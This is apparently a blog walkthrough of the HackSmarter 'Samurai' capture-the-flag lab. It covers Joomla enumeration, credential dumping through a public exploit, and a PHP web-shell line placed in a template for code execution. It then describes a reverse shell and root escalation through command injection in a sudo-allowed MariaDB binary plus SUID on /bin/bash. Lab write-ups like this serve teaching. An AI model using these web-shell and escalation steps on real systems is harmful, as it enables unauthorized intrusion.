---
title: "HackSmarter Samurai Walkthrough "
date: 2026-05-10 00:00:00 +0000
categories: [HackSmarter]
tags: [Hacksmarter , Easy , Walkthrough , Linux ]
---

# Summary : 

In this lab, we start by enumerating the target and discovering that it is running Joomla. Using joomscan, we identify the exact version and find a known unauthenticated information disclosure vulnerability (CVE-51334) that allows us to dump credentials from the database. We use those credentials to log in to the Joomla admin panel and achieve Remote Code Execution by modifying a template file. From there, we get a reverse shell as www-data and stabilize it. During privilege escalation, we discover that our user can run MariaDB as root without a password. We abuse a command injection vulnerability in the database name parameter to execute commands as root, set the SUID bit on /bin/bash, and finally use GTFOBins to spawn a root shell and capture the flag.


# Enumeration : 

First thing we start with an nmap scan : 


<img width="1219" height="530" alt="image" src="https://github.com/user-attachments/assets/28d44a2a-3676-4495-a69e-eb445d3ca1d2" />


We see 2 ports open , SSH and 80 , let’s visit the website : 


<img width="1150" height="801" alt="image" src="https://github.com/user-attachments/assets/c1e443db-a582-452f-9e69-c73b428d8b78" />


Nothing really useful just a simple static web page , source code doesn’t hold any sensitive information , all we can really do is FUZZ for other endpoints , start with directories , then files then subdomains . 


<img width="1367" height="773" alt="image" src="https://github.com/user-attachments/assets/8ec727d7-0311-4ee5-bd20-1365ebc930ec" />


Now we do find multiple Plugins and themese , so definelty a CMS is in place , we find that it is using Joomla . 


<img width="1270" height="667" alt="image" src="https://github.com/user-attachments/assets/fe5e45f2-548e-4434-896d-fd8d1db1bc13" />


Most directories return 404 or blank pages , but we do find the Admin portal :


<img width="1415" height="813" alt="image" src="https://github.com/user-attachments/assets/7df79ee1-c760-48ae-9143-96aeae7697b8" />


Tried common usernames and password but it didn’t work . 
Now let’s use a tool to scan the website , maybe we will get a version or something , for this i will be using joomscan :

```bash
sudo apt install joomscan 
joomscan -u http://$target    
```

<img width="1046" height="727" alt="image" src="https://github.com/user-attachments/assets/286dd9e7-18c8-4c1c-a7ad-5a64e8d68433" />


# Exploitation : 

Great now we got the version , if we search for exploits for this specific version , we will find this one 

https://www.exploit-db.com/exploits/51334

Which is a unauthenticated Information Disclosure that we can use to dump credentials and use them to login  .



<img width="891" height="584" alt="image" src="https://github.com/user-attachments/assets/635d4cfb-bf38-4109-b34d-04a55b5edcf7" />


Now to use if we first need to install some gems , you will find them all at the top of the exploit . 

```bash
vim exploit.rb ==> Then paste your exploit
chmod +x exploit.rb 
sudo gem install paint httpx docopt paint
./exploit.rb 
```


<img width="1072" height="705" alt="image" src="https://github.com/user-attachments/assets/60fa204e-25f8-4f20-9727-e8a92e16a8d7" />


Now we just use it and provide the URL : 


<img width="830" height="710" alt="image" src="https://github.com/user-attachments/assets/dbfb936f-2900-4708-8f0d-18e35fea63ca" />


And just like that we are dump the username and DB Password , we can try the username Miyamoto with the DB Password to see if we can login , and we do . 

Now first thing we should think about is how to get an RCE from the admin panel . 

I already have these steps in my Web app methodology , to get an RCE :

```bash
==> Attacking Joomla : 
+ Say we brute forced the login and got admin access , we can go to : 
http://$target/administrator
+ Then we just modify a template just like with WP : 
+ Go to System then Templates then modify the error.php to add this one liner : 
system($_GET['cmd']);
+ Then a simple curl will trigger it : 
curl http://$target/templates/cassiopeia/error.php?cmd=id
```


<img width="1255" height="567" alt="image" src="https://github.com/user-attachments/assets/3bac2ccf-0419-4f39-a24c-f699ff45ae15" />


Now a simple curl will get us RCE , now let’s try and get a full reverse Shell . for this we can use Revshell website , this time the machine already has python , but i still preferred using a bash Revershell , but you can choose anything you want (if the command doesn’t work URL encode the payload first)


<img width="1539" height="735" alt="image" src="https://github.com/user-attachments/assets/581f8858-8117-4ce3-ad20-9ef5794f252c" />


In my case , i had some trouble due to zsh misinterpreting my payload, so i decided to put the payload on a file and host it then call it from the server and finally execute it to get our reverse shell . 


<img width="1862" height="717" alt="image" src="https://github.com/user-attachments/assets/80a30536-da03-49cb-a76c-50285402fb59" />

Perfect , now all we need to do is stabilize our shell to be able to privesc easily .

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
ssty -a : this will give us the rows and columns . 
background
stty raw -echo; fg
stty rows number_of_rows cols number_of_columns  
export TERM=xterm-256color 
PS1='\[\e[31m\]\u\[\e[96m\]@\[\e[35m\]\H\[\e[0m\]:\[\e[93m\]\w\[\e[0m\]\$'

Or : PS1='\[\e[31m\]\u\[\e[96m\]@\[\e[35m\]\H\[\e[0m\]:\[\e[93m\]\w\[\e[0m\]\$ '

```

<img width="848" height="459" alt="image" src="https://github.com/user-attachments/assets/7664be97-95ba-4fa8-9fbb-996984182d4c" />


Nice now , we ve got a stable shell we can use to privesc . 

# Privilege Escalation : 

Before i start importing linpeas , i always like testing things manually first , for websites that are running CMS , it's always good to check config files for DB creds , but in our case we already had those. 
Now let's first check for the quick wins : 
```bash
id : Check for Groups and Which user . 
cat /etc/passwd : Check other users on the machine . 
sudo -l : which prog can be ran with root perm . 
uname -sr / lsb_relase -a : Version + architecture .  
find / -type f -perm -04000 -ls 2>/dev/null : Find binaries with SUID . 
Check for Bash History . 
If we can Write into a file and execute it as anOTher user , always put a RevShell there .
If you get Creds always test for password Reuse . 
cat /etc/fstab : if there is an nfs . 
sudo -V : check sudo version for privesc . 

# Kenrel PrivEsc : 
uname -a : Check the kernel version and check if it has privesc vectors . 
```
We do find that our user can execute the MariaDB binary as root without requiring a password . 

<img width="1182" height="440" alt="image" src="https://github.com/user-attachments/assets/35d84192-8ccd-4045-8434-e3fae20c5ce6" />

Now if we run the binary , we're asked for a database name :

<img width="945" height="267" alt="image" src="https://github.com/user-attachments/assets/6f3d6267-990f-48bb-990a-ce4338816326" />

Since we're dealing with DB names , let's try some basic SQLi , first i tried calling  a db that didn't exist , which returned an error , then i commented everything else and i was able to get a valid SQLi . 

<img width="1108" height="577" alt="image" src="https://github.com/user-attachments/assets/99a18192-1b32-4ea0-a723-92616c205044" />

Now let's see if we can add the command we want to execute and comment the rest and see if we can actually have command injection as well . 

<img width="1122" height="512" alt="image" src="https://github.com/user-attachments/assets/13adfe08-baa8-48b3-8cfe-eba1a99ccbc8" />

And we do! Now we can execute anything as the root user. Let's use that to set the SUID bit on /bin/bash and then use GTFOBins to get a root shell.

```bash
chmod +s /bin/bash ==> Make /bin/bash SUID 
bash -p : Spawn a root shell by abusing the SUID bit on bash, as documented on GTFOBins.
```

<img width="1129" height="590" alt="image" src="https://github.com/user-attachments/assets/5f945338-6b07-4340-bd6b-bc3a3a153489" />

Just like that we are root , now just go to the root directory and get the flag : 

<img width="1024" height="386" alt="image" src="https://github.com/user-attachments/assets/2c53b383-dff8-428f-af04-11acc296d547" />

That was everything for this Lab , hope you found it useful . 

